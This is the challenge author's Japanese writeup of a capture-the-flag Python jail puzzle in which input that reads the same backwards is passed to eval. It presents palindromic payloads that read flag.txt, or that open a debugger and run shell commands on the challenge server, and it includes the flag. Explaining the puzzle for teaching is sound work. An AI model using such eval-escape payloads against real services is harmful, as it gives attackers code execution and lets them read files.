# Author's Writeup for jailaij

Daily AlpacaHack で 1/6 に出題した『jailiaj』の作問者 Writeup (解法2つ) です。

https://alpacahack.com/daily/challenges/jailiaj

## 問題概要

添付ファイルに次の Python スクリプトが含まれています。

```python
# flag is in ./flag.txt
s = input("> ")
assert s == s[::-1], "Not a palindrome!"
eval(s)
```

入力を与えると、それが回文かどうかがチェックされます。

回文であれば、`eval` によってその入力が評価されます。

適切な入力を与えて `./flag.txt` の中身を読むのがゴールです。


## 解法1: コメントを使う

`eval` ではコメント `#` を使えます。

`print(open("flag.txt").read())` の後に `#(反転させた文字列)` を続けたペイロードを入力すれば解けます:

```py
print(open("flag.txt").read()) # ))(daer.)"txt.galf"(nepo(tnirp
```

ちなみに、このペイロードでは `flag.txt` を直接読み取っていますが、`breakpoint()` をまず実行してデバッガを起動して、その後にフラグファイルを読むこともできます。

```
$ nc 34.170.146.252 34185
> breakpoint() # )(tniopkaerb
> <string>(1)<module>()
(Pdb) import os
(Pdb) os.system("cat flag*")
Alpaca{nkosopa_life_is_beautiful}
0
```

`breakpoint()` のほうが後から色々実行できるので実用的です。

## 解法2: エスケープのトリックを使う

実はコメント `#` を使わなくても解けます。

次のペイロードが回文となる構造を考えてみます:

```py
"[文字列A]",breakpoint(),"[文字列X]"
```

`[文字列A]`, `[文字列X]` には適切な文字列が入るものとします。

`[文字列A]` の右隣の `"` が回文の中心になると考えた場合、上記ペイロードはより具体的に次のように表せます:

```py
"[文字列B],)(tniopkaerb,",breakpoint(),"[文字列X]"
```

ここで、 `[文字列B]` は `"` + `[文字列X]` を反転させたものになります。

ただし `[文字列B]` に `"` を単純に含めてしまうと、そこで文字列が途切れてしまいます。

そのため `"` を `\` でエスケープすることを考えると、ペイロードは次のようになります:

```py
"[文字列C]\",)(tniopkaerb,",breakpoint(),"[文字列X]"
```

ここで、 `[文字列X]` は `[文字列C]` + `\` を反転させたものになります。

エスケープ `\` に対処する必要があり、 `\` の後に例えば `n` を続ければ改行文字になることを利用すれば、ペイロードを次の形に発展できます:

```py
"[文字列C]\",)(tniopkaerb,",breakpoint(),"\n[文字列Y]"
```

ここで、 `[文字列C]` は `n` + `[文字列Y]` を反転させたものなので、ペイロードはさらに次のように表せます:

```py
"[文字列D]n\",)(tniopkaerb,",breakpoint(),"\n[文字列Y]"
```

ここで、 `[文字列D]` は `[文字列Y]` を反転させた文字列です。
つまり、空文字列を含め適当な文字列を設定できます。

よって、最終的なペイロードは次のようになります:

```py
"n\",)(tniopkaerb,",breakpoint(),"\n"
```

`\` の存在により、 `n\"` とその反転 `"\n` で解釈の仕方が変化する非対称性を利用している、というわけです。

Flag: `Alpaca{nkosopa_life_is_beautiful}`

他の解法パターンがあればぜひWriteupを投稿してください！

**追記**: 他にも色々解法がありました！
- [f-string を利用した解法 by rsk0315さん](https://rsk0315.hatenablog.com/entry/2026/01/07/013304)
- [''' を利用した解法 by tchenさん](https://x.com/tepelchen501/status/2008809276383560150)
